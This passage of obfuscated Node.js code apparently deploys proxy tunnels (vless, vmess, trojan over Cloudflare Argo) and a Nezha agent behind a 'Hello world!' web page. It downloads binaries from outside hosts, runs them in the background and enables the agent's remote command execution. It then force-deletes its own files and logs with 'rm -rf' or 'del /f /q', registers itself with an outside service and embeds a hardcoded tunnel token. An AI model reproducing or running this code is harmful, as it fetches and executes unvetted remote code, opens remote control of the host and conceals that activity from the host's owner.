_0x1c78cb={_0x18f07c:0x1d5},_0x3394b4={_0x3a3e32:0x235},_0x3bd169=_0x8bdc,_0x77fee2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x77fee2[_0x3bd169(0x20d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x77fee2[_0x3bd169(0x20d)](phpPath);process[_0x3bd169(_0x4268e8._0x13d3d0)]===_0x3bd169(_0x4268e8._0x3b775f)?exec('del\x20/f\x20/q\x20'+_0x77fee2[_0x3bd169(0x22e)]('\x20')+_0x3bd169(_0x4268e8._0x53a9ee),_0x2ad592=>{const _0x1107e0=_0x3bd169;console['clear'](),console['log'](_0x1107e0(0x238)),console[_0x1107e0(0x1d5)](_0x1107e0(_0x3394b4._0x3a3e32));}):exec('rm\x20-rf\x20'+_0x77fee2['join']('\x20')+_0x3bd169(0x250),_0x17d7e0=>{const _0x415755=_0x3bd169;console[_0x415755(0x1fa)](),console[_0x415755(0x1d5)](_0x415755(0x238)),console[_0x415755(_0x1c78cb._0x18f07c)](_0x415755(0x235));});},0x15f90);}function _0x1601(){const _0x33f0b6=['tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','vless','https://oooo.serv00.net/add-url','true','https+local://8.8.8.8/dns-query','21937179isUlcE','from','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','country_code','none','has','/tunnel.yml\x20run','clear','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','PORT','http\x20server\x20is\x20running\x20on\x20port:','/config.json\x20>/dev/null\x202>&1\x20&','01894366-49fb-462b-8c76-a62a7d6d93f3','random','env','existsSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Error\x20downloading\x20files:','127.0.0.1','https://amd64.ssss.nyc.mn/bot','\x20failed:\x20','Hello\x20world!','Unknown','tls','set','./tmp','push','Subscription\x20uploaded\x20successfully','firefox','https://amd64.ssss.nyc.mn/agent','chmod','tunnel.yml','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','config.yaml','135566gVzpHg','https://arm64.ssss.nyc.mn/agent','tunnel.json','pkill\x20-f\x20\x22[','Unhandled\x20error\x20in\x20startserver:','org','fileName','\x0aclient_secret:\x20','365630kdNRXr','pipe','1841aBUZlS','match','list.txt','basename','status','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','map','data','ARGO_AUTH','PROJECT_URL','Error\x20reading\x20boot.log:','all','blackhole','readFileSync','forEach','join','abcdefghijklmnopqrstuvwxyz','arm','util','\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','createWriteStream','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','2087','\x20already\x20exists','App\x20is\x20running','Download\x20','floor','\x20-c\x20\x22','then','https://ipapi.co/json/','NEZHA_SERVER','mkdirSync','application/json','pop','child_process','&path=%2Ftrojan-argo%3Fed%3D2560#','unshift','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','UPLOAD_URL','test','\x0a\x20\x20tunnel:\x20','/trojan-argo','Add\x20automatic\x20access\x20task\x20faild:\x20','error','/sub.txt\x20saved\x20successfully','1827205XduLOX','send','?encryption=none&security=tls&sni=','\x20>/dev/null\x202>&1','UUID','platform','fileUrl','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','arch','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','FILE_PATH','Empowerment\x20failed\x20for\x20','xtls-rprx-vision','utf-8','unlinkSync','eyJhIjoiMjZmODZlZmI1NzU1OWMwMDc0NDUzYjZkOGYzOWEzZjEiLCJ0IjoiMDVhZTZkM2ItMjJmYi00YWJmLTk1NDMtNzNhYjQ3NGE2YmExIiwicyI6IlpXVTVaVEV4TWpndE5HSmtZaTAwWXpjd0xXSmpPV1l0Tnpjd00yVmxNakkzTW1WbSJ9','\x20-s\x20','2083','\x0avless://','NAME','split','?security=tls&sni=','web\x20running\x20error:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','success','includes','Error\x20executing\x20command:\x20','--tls','npm\x20running\x20error:\x20','exec','post','8443','\x20>\x20nul\x202>&1','15PFULOU','\x22\x20>\x20/dev/null\x202>&1','catch','writeFileSync','quic','4872816xKlpwn','length','https://amd64.ssss.nyc.mn/v1','8MGfqcx','nohup\x20','\x0a\x20\x20credentials-file:\x20','NEZHA_KEY','tcp','sub.txt','countryCode','443','taskkill\x20/f\x20/im\x20','text/plain;\x20charset=utf-8','\x20is\x20running','/vless-argo','base64','toString','ARGO_DOMAIN:','config.json','trojan','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Skipping\x20adding\x20automatic\x20access\x20task','charAt','\x20>/dev/null\x202>&1\x20&','message','https://amd64.ssss.nyc.mn/web','NEZHA_PORT','Error\x20in\x20startserver:','get','ArgoDomain:','948VPqNGe','filter','2096','TunnelSecret','&fp=firefox&type=ws&host=','statSync','log','Nodes\x20uploaded\x20successfully','automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/bot','unlink','/vmess-argo?ed=2560','stream','18lgvRsR','CFPORT','freedom','/vmess-argo','/dev/null','stringify','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','response','finish','direct','210628HMHunV','win32','ARGO_PORT','path','\x20is\x20created','http','2053','isFile'];_0x1601=function(){return _0x33f0b6;};return _0x1601();}cleanFiles();async function AddVisitTask(){const _0x595d7a={_0x2407df:0x1c6,_0x1791c4:0x240,_0x174de2:0x1c9},_0x71ca8a=_0x51611a;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x71ca8a(_0x595d7a._0x2407df));return;}try{const _0x2449bd=await axios['post'](_0x71ca8a(0x1f0),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x71ca8a(_0x595d7a._0x1791c4)}});return console[_0x71ca8a(0x1d5)](_0x71ca8a(0x1d7)),_0x2449bd;}catch(_0x6154d3){return console['error'](_0x71ca8a(0x24a)+_0x6154d3[_0x71ca8a(_0x595d7a._0x174de2)]),null;}}async function startserver(){const _0x9bff9c={_0xffe7b0:0x1cc},_0x2576a4=_0x51611a;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x167840){console[_0x2576a4(0x24b)](_0x2576a4(_0x9bff9c._0xffe7b0),_0x167840);}}startserver()[_0x51611a(0x1ae)](_0x10236d=>{const _0x1246d6={_0x2875db:0x24b,_0x5347ec:0x219},_0x33a1f7=_0x51611a;console[_0x33a1f7(_0x1246d6._0x2875db)](_0x33a1f7(_0x1246d6._0x5347ec),_0x10236d);}),app['listen'](PORT,()=>console[_0x51611a(0x1d5)](_0x51611a(0x1fd)+PORT+'!'));
